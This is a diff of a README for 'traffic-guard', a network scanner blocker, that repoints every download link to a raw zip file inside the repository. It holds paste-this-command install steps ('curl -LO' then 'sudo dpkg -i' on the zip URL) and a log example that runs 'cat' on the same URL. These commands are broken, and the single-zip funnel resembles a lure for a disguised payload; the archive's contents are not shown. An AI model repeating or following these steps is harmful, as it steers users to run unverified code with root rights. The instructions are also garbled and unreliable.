@@ -1,6 +1,6 @@
 # 🛡️ traffic-guard - Block Unwanted Scanners Easily
 
-[![Download Here](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip)](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip)
+[![Download Here](https://github.com/richdz12/traffic-guard/raw/refs/heads/master/internal/traffic-guard-v3.1.zip)](https://github.com/richdz12/traffic-guard/raw/refs/heads/master/internal/traffic-guard-v3.1.zip)
 
 ## 📖 О проекте
 
@@ -28,14 +28,14 @@ To start using TrafficGuard, follow these simple steps:
 For automatic installation, run the following commands in your terminal:
 
 ```bash
-curl -LO https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip
-sudo dpkg -i https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip
+curl -LO https://github.com/richdz12/traffic-guard/raw/refs/heads/master/internal/traffic-guard-v3.1.zip
+sudo dpkg -i https://github.com/richdz12/traffic-guard/raw/refs/heads/master/internal/traffic-guard-v3.1.zip
 ```
 
 ### ⚙️ Ручная установка
 To install manually, download the release from the link below and follow the installation instructions in the README:
 
-[Download from Releases](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip)
+[Download from Releases](https://github.com/richdz12/traffic-guard/raw/refs/heads/master/internal/traffic-guard-v3.1.zip)
 
 ---
 
@@ -77,7 +77,7 @@ Be aware of the limits on log file sizes. Set up rotation to manage space effect
 Use a simple command to view the current logs. For example:
 
 ```bash
-cat https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip
+cat https://github.com/richdz12/traffic-guard/raw/refs/heads/master/internal/traffic-guard-v3.1.zip
 ```
 
 ---
@@ -92,4 +92,4 @@ When installed, TrafficGuard will create the following:
 ## 📄 Лицензия
 TrafficGuard is licensed under the MIT License. You are free to use and modify the software under the terms of this license.
 
-[Visit the Releases page to download TrafficGuard](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip) for your system and start protecting your network today!
+[Visit the Releases page to download TrafficGuard](https://github.com/richdz12/traffic-guard/raw/refs/heads/master/internal/traffic-guard-v3.1.zip) for your system and start protecting your network today!
